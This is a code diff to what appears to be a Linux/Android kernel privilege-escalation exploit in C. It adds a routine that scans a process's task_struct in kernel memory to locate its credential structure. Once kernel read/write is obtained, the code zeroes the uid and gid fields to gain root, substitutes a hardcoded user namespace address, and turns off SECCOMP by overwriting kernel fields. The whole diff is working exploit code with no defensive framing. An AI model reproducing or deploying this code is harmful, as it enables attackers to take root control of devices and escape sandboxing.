@@ -610,6 +610,35 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
     return 0;
 }
 
+int verifyCred(unsigned long cred_ptr) {
+    unsigned uid;
+    if (cred_ptr < 0xffffff0000000000ul || 4 != raw_kernel_read(cred_ptr+OFFSET__cred__uid, &uid, 4))
+        return 0;
+    return uid == getuid();
+}
+
+int getCredOffset(unsigned long task_struct_ptr, char* execName) {
+    char taskname[16];
+    char* p = strrchr(execName, '/');
+    if (p == NULL)
+        p = execName;
+    else
+        p++;
+    unsigned n = MIN(strlen(p)+1, 16);
+    memcpy(taskname, p, n);
+    p[15] = 0; // TODO: see if 16 character names are null terminated or not
+    
+    unsigned char task_struct_data[PAGE+16];
+    kernel_read(task_struct_ptr, task_struct_data, PAGE);
+    for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) 
+        if (0 == memcmp(task_struct_data+i, p, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
+            return i-8;
+        
+    errno=0;
+    error("Cannot find cred structure");
+    return -1;
+}
+
 int main(int argc, char **argv)
 {
     if (argc >= 2)
@@ -639,9 +668,14 @@ int main(int argc, char **argv)
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
 
-    message("MAIN: setting root credentials");
-    unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + OFFSET__task_struct__cred);
+    message("MAIN: searching for cred offset in task_struct");
+        
+    unsigned long offset_task_struct__cred = getCredOffset(task_struct_ptr, argv[0]);
+    
+    unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
 
+    message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
+    
     for (int i = 0; i < 8; i++)
         kernel_write_uint(cred_ptr + OFFSET__cred__uid + i * 4, 0);
 
@@ -663,17 +697,21 @@ int main(int argc, char **argv)
 
 #ifdef OFFSET__cred__user_ns    
     unsigned long user_ns = kernel_read_ulong(cred_ptr + OFFSET__cred__user_ns);
+    if (user_ns < 0xffffffc000000000ul || user_ns >= 0xffffffd000000000ul)
+        user_ns = 0xffffffc001744b70ul;
 #else
     unsigned long user_ns = 0xffffffc001744b70ul;
 #endif
 
     message("MAIN: user_ns = %lx", user_ns);
 
-    message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
-    if (prctl(PR_GET_SECCOMP))
+    int seccompStatus = prctl(PR_GET_SECCOMP);
+    message("MAIN: SECCOMP status %d", seccompStatus);
+    if (seccompStatus)
     {
         message("MAIN: disabling SECCOMP");
         kernel_write_ulong(thread_info_ptr + OFFSET__thread_info__flags, 0);
+        // TODO: search for seccomp offset
         kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp, 0);
         kernel_write_ulong(task_struct_ptr + OFFSET__task_struct__seccomp + 8, 0);
         message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
